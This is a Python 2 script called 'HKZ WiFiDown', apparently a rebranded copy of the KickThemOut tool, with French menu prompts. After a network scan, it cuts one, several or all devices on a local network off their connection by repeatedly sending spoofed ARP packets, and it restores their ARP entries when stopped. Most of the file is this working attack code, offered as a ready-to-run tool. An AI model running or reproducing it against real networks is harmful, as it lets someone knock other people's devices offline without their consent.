#!/usr/bin/env python
# -.- coding: utf-8 -.-
# hkzwifidown.py
# authors: hkz


import time, os, sys, logging, math
from time import sleep
import urllib2 as urllib
import traceback
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

notRoot = False
try:
    # check whether user is root
    if os.geteuid() != 0:
        print("\n{0}ERROR: HKZ WiFiDown must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python hkzwifidown.py{2}\n").format(RED, GREEN, END)
        notRoot = True
except:
    # then user is probably on windows
    pass
if notRoot:
    raise SystemExit

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.all import *
    import scan, spoof
except:
    print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.").format(RED)
    print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(RED, BLUE, END)
    raise SystemExit



# display heading
def heading():
    spaces = " " * 76
    sys.stdout.write(GREEN + spaces + """

 ██░ ██  ██ ▄█▀▒███████▒    █     █░ ██▓  █████▒██▓▓█████▄  ▒█████   █     █░███▄    █ 
▓██░ ██▒ ██▄█▒ ▒ ▒ ▒ ▄▀░   ▓█░ █ ░█░▓██▒▓██   ▒▓██▒▒██▀ ██▌▒██▒  ██▒▓█░ █ ░█░██ ▀█   █ 
▒██▀▀██░▓███▄░ ░ ▒ ▄▀▒░    ▒█░ █ ░█ ▒██▒▒████ ░▒██▒░██   █▌▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒
░▓█ ░██ ▓██ █▄   ▄▀▒   ░   ░█░ █ ░█ ░██░░▓█▒  ░░██░░▓█▄   ▌▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒
░▓█▒░██▓▒██▒ █▄▒███████▒   ░░██▒██▓ ░██░░▒█░   ░██░░▒████▓ ░ ████▓▒░░░██▒██▓▒██░   ▓██░
 ▒ ░░▒░▒▒ ▒▒ ▓▒░▒▒ ▓░▒░▒   ░ ▓░▒ ▒  ░▓   ▒ ░   ░▓   ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒ 
 ▒ ░▒░ ░░ ░▒ ▒░░░▒ ▒ ░ ▒     ▒ ░ ░   ▒ ░ ░      ▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░
 ░  ░░ ░░ ░░ ░ ░ ░ ░ ░ ░     ░   ░   ▒ ░ ░ ░    ▒ ░ ░ ░  ░ ░ ░ ░ ▒    ░   ░    ░   ░ ░ 
 ░  ░  ░░  ░     ░ ░           ░     ░          ░     ░        ░ ░      ░            ░ 
               ░                                    ░                                  
    """ + END + BLUE +
    '\n' + '{0}[{1}HKZ WIFIDOWN{2}]{3}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
    '\n' + 'Made by: {0}Thomas ({1}HKZ{2}){3}'.format(
        YELLOW, RED, YELLOW, BLUE).center(98) +
    '\n' + 'Version: {0}0.1{1}\n'.format(YELLOW, END).center(87))




# display options
def optionBanner():
    print('\nChoisir une option:\n')
    sleep(0.2)
    print('\t{0}[{1}1{2}]{3} Paralysation > 1 Device').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}2{2}]{3} Paralysation > Multiple Devices').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}3{2}]{3} Paralysation > All Devices').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\n\t{0}[{1}E{2}]{3} Exit tool\n').format(YELLOW, RED, YELLOW, WHITE)



# initiate debugging process
def runDebug():
    print("\n\n{0}WARNING! An unknown error has occurred, starting debug...{1}").format(RED, END)
    print(
    "{0}Starting debug... (Please report this crash on 'https://github.com/k4m4/kickthemout/issues' with your private information removed where necessary){1}").format(
        RED, END)
    print("{0}").format(RED)
    try:
        print("Current defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to print defaultGatewayMac...")
    try:
        print ("Reloading mac getter function...")
        regenOnlineIPs()
        print("Reloaded defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to reload mac getter function / to print defaultGatewayMac...")
    try:
        print ("Known gateway IP: " + defaultGatewayIP)
    except:
        print ("Failed to print defaultGatewayIP...")
    try:
        print ("Current hostslist array: ")
        print hostsList
    except:
        print ("Failed to print hostsList array...")
    try:
        print ("Crash trace: ")
        print(traceback.format_exc())
    except:
        print ("Failed to print crash trace...")
    print ("DEBUG FINISHED.\nShutting down...")
    print("{0}").format(END)
    raise SystemExit



# regenerate online IPs array & configure gateway
def regenOnlineIPs():
    global onlineIPs
    global defaultGatewayMac
    global defaultGatewayMacSet

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # request gateway MAC address (after failed detection by scapy)
        print("\n{0}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ("{0}WIFIDOWN{1}> {2}Enter your gateway's MAC Address {3}(MM:MM:MM:SS:SS:SS): ".format(BLUE, WHITE, RED, END))
        defaultGatewayMac = raw_input(header)
        defaultGatewayMacSet = True



# scan network
def scanNetwork():
    global hostsList
    try:
        # call scanning function from scan.py
        hostsList = scan.scanNetwork(getDefaultInterface(True))
    except KeyboardInterrupt:
        print('\n\n{0}Merci et � plus tard\nHKZ.FR{1}').format(GREEN, END)
        raise SystemExit
    except:
        print("\n{0}ERROR: Network scanning failed. Please check your requirements configuration.{1}\n").format(RED, END)
        raise SystemExit
    regenOnlineIPs()



# kick one device
def kickoneoff():
    os.system("clear||cls")

    print("\n{0}Paralysation > 1 Device{1} selected.{2}\n").format(RED, GREEN, END)
    sys.stdout.write("{0}En attente...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()


    print("Appareils en ligne: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t"+ vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)

    canBreak = False
    while not canBreak:
        try:
            choice = int(raw_input("\nChoissisez l'appareil: "))
            one_target_ip = onlineIPs[choice]
            canBreak = True
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERREUR: Choissisez un chiffre!{1}").format(RED, END)

    # locate MAC of specified device
    one_target_mac = ""
    for host in hostsList:
        if host[0] == one_target_ip:
            one_target_mac = host[1]
    if one_target_mac == "":
        print("\nCet appareil n'est pas en ligne, choissisez en un autre.")
        return

    print("\n{0}Appareil: {1}" + one_target_ip).format(GREEN, END)

    print("\n{0}Opération démarrée {1}").format(GREEN, END)
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
            time.sleep(10)
    except KeyboardInterrupt:
        # re-arp target on KeyboardInterrupt exception
        print("\n{0}Arr�t en cours,{1} patientez.{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            try:
                # broadcast ARP packets with legitimate info to restore connection
                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
            except KeyboardInterrupt:
                pass
            except:
                runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Arr�t{1} r�ussi.{2}").format(RED, GREEN, END)



# kick multiple devices
def kicksomeoff():
    os.system("clear||cls")

    print("\n{0}Paralysation > Multiple Device{1} selected.{2}\n").format(RED, GREEN, END)
    sys.stdout.write("{0}En attente.{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()

    print("Appareils en ligne:")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t" + vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)

    canBreak = False
    while not canBreak:
        try:
            choice = raw_input("\nChoissisez plusieurs appareils (Separated by ','): ")
            if ',' in choice:
                some_targets = choice.split(",")
                canBreak = True
            else:
                print("\n{0}ERREUR: Entrez plusieurs appareils.{1}\n").format(RED, END)
        except KeyboardInterrupt:
            return

    some_ipList = ""
    for i in some_targets:
        try:
            some_ipList += GREEN + "'" + RED + onlineIPs[int(i)] + GREEN + "', "
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERREUR: '{1}" + i + "{2}' n'est pas en ligne.{3}\n").format(RED, GREEN, RED, END)
            return
    some_ipList = some_ipList[:-2] + END

    print("\n{0}Appareils: {1}" + some_ipList).format(GREEN, END)

    print("\n{0}Opération démarrée {1}").format(GREEN, END)
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            for i in some_targets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            time.sleep(10)
    except KeyboardInterrupt:
        # re-arp targets on KeyboardInterrupt exception
        print("\n{0}Arr�t en cours,{1} patientez.{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for i in some_targets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        try:
                            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                        except KeyboardInterrupt:
                            pass
                        except:
                            runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Arr�t{1} r�ussi.{2}").format(RED, GREEN, END)



# kick all devices
def kickalloff():
    os.system("clear||cls")

    print("\n{0}Paralysation > All Devices{1} selected...{2}\n").format(RED, GREEN, END)
    sys.stdout.write("{0}En attente...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()

    print("Appareils en ligne: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print(str("  {0}"+ str(onlineIPs[i]) + "{1}\t" + vendor + "{2}").format(RED, GREEN, END))

    print("\n{0}Opération démarrée {1}").format(GREEN, END)
    try:
        # broadcast malicious ARP packets (10p/s)
        reScan = 0
        while True:
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    # dodge gateway (avoid crashing network itself)
                    spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n{0}Arr�t en cours,{1} patientez.{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    try:
                        # dodge gateway
                        spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                    except KeyboardInterrupt:
                        pass
                    except:
                        runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Arr�t{1} r�ussi.{2}").format(RED, GREEN, END)



# retrieve network interface
def getDefaultInterface(returnNet=False):
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("illegal netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None
        return net

    iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
    network, netmask, _, interface, address = max(iface_routes, key=lambda item:item[1])
    net = to_CIDR_notation(network, netmask)
    if net:
        if returnNet:
            return net
        else:
            return interface



# retrieve gateway IP
def getGatewayIP():
    try:
        getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        return getGateway_p.src
    except:
        # request gateway IP address (after failed detection by scapy)
        print("\n{0}ERROR: Gateway IP could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
        header = ('{0}WIFIDOWN1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
        gatewayIP = raw_input(header)
        return gatewayIP



# retrieve default interface MAC address
def getDefaultInterfaceMAC():
    try:
        defaultInterfaceMac = get_if_hwaddr(defaultInterface)
        if defaultInterfaceMac == "" or not defaultInterfaceMac:
            print(
            "\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(
                RED, END)
            header = ('{0}WIFIDOWN{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
            defaultInterfaceMac = raw_input(header)
            return defaultInterfaceMac
        else:
            return defaultInterfaceMac
    except:
        # request interface MAC address (after failed detection by scapy)
        print("\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ('{0}WIFIDOWN{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
        defaultInterfaceMac = raw_input(header)
        return defaultInterfaceMac



# resolve mac address of each vendor
def resolveMac(mac):
    try:
        # sen request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except:
        return "N/A"



# script's main function
def main():

    # display heading
    heading()


    print(
        "\n{0}Utilisation de l'interface '{1}" + defaultInterface + "{2}' Adresse Mac '{3}" + defaultInterfaceMac + "{4}'.\nAdresse IP Interne [ROUTEUR]: '{5}"
        + defaultGatewayIP + "{6}' --> {7}" + str(len(hostsList)) + "{8} Devices online.{9}").format(GREEN, RED, GREEN, RED, GREEN, 
                                                                                                RED, GREEN, RED, GREEN, END)
    # display warning in case of no active hosts
    if len(hostsList) == 0 or len(hostsList) == 1:
        if len(hostsList) == 1:
            if hostsList[0][0] == defaultGatewayIP:
                print("\n{0}{1}WARNING: There are {2}0{3} hosts up on you network except your gateway.\n\tYou can't kick anyone off {4}:/{5}\n").format(
                    GREEN, RED, GREEN, RED, GREEN, END)
                raise SystemExit
        else:
            print(
            "\n{0}{1}WARNING: There are {2}0{3} hosts up on you network.\n\tIt looks like something went wrong {4}:/{5}").format(
                GREEN, RED, GREEN, RED, GREEN, END)
            print(
            "\n{0}If you are experiencing this error multiple times, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(
                RED, BLUE, END)
            raise SystemExit

    try:

        while True:

            optionBanner()

            header = ('{0}HKZ WiFIDown{1}> {2}'.format(BLUE, WHITE, END))
            choice = raw_input(header)

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\n{0}Merci et � plus tard!'
                      '\nHKZ.FR{1}').format(GREEN, END)
                raise SystemExit
            elif choice == '1':
                kickoneoff()
            elif choice == '2':
                kicksomeoff()
            elif choice == '3':
                kickalloff()
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            else:
                print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)

    except KeyboardInterrupt:
        print('\n\n{0}Merci et à plus tard!'
              '\nBy HKZ.FR{1}').format(GREEN, END)

if __name__ == '__main__':

    # configure appropriate network info
    sys.stdout.write("{0}Scan du réseau en cours, patientez.{1}\r".format(GREEN, END))
    sys.stdout.flush()
    defaultInterface = getDefaultInterface()
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = getDefaultInterfaceMAC()
    global defaultGatewayMacSet
    defaultGatewayMacSet = False

    # commence scanning process
    scanNetwork()

    main()
